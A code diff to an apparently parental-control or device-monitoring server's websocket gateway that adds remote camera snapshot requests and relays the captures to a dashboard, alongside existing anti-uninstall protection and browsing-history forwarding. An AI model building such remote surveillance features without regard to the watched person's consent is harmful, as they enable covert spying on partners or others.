@@ -105,6 +105,12 @@ let GuardianGateway = GuardianGateway_1 = class GuardianGateway {
         this.server.to(`device:${data.deviceId}`).emit('app:show');
         return { event: 'app_shown', deviceId: data.deviceId };
     }
+    handleCameraRequest(data) {
+        const cameraType = data.cameraType || 'BACK';
+        this.logger.log(`Camera snapshot requested for device ${data.deviceId} (${cameraType})`);
+        this.server.to(`device:${data.deviceId}`).emit('camera:capture', { cameraType });
+        return { event: 'camera_requested', deviceId: data.deviceId, cameraType };
+    }
     handleSetProtection(data) {
         this.logger.log(`Setting anti-uninstall protection for device ${data.deviceId} -> ${data.enabled}`);
         this.server.to(`device:${data.deviceId}`).emit('protection:set', {
@@ -147,6 +153,12 @@ let GuardianGateway = GuardianGateway_1 = class GuardianGateway {
         this.server.to('dashboard').emit('browsing:new', {
             deviceId: payload.deviceId,
             browsing: payload.data,
+        });
+    }
+    handleCaptureCreated(payload) {
+        this.server.to('dashboard').emit('capture:new', {
+            deviceId: payload.deviceId,
+            capture: payload.data,
         });
     }
     handleAppsSync(payload) {
@@ -239,6 +251,13 @@ __decorate([
     __metadata("design:returntype", void 0)
 ], GuardianGateway.prototype, "handleShowApp", null);
 __decorate([
+    (0, websockets_1.SubscribeMessage)('camera:request'),
+    __param(0, (0, websockets_1.MessageBody)()),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [Object]),
+    __metadata("design:returntype", void 0)
+], GuardianGateway.prototype, "handleCameraRequest", null);
+__decorate([
     (0, websockets_1.SubscribeMessage)('set_protection'),
     __param(0, (0, websockets_1.MessageBody)()),
     __metadata("design:type", Function),
@@ -269,6 +288,12 @@ __decorate([
     __metadata("design:paramtypes", [Object]),
     __metadata("design:returntype", void 0)
 ], GuardianGateway.prototype, "handleBrowsingCreated", null);
+__decorate([
+    (0, event_emitter_1.OnEvent)('capture.created'),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [Object]),
+    __metadata("design:returntype", void 0)
+], GuardianGateway.prototype, "handleCaptureCreated", null);
 __decorate([
     (0, event_emitter_1.OnEvent)('apps.synced'),
     __metadata("design:type", Function),
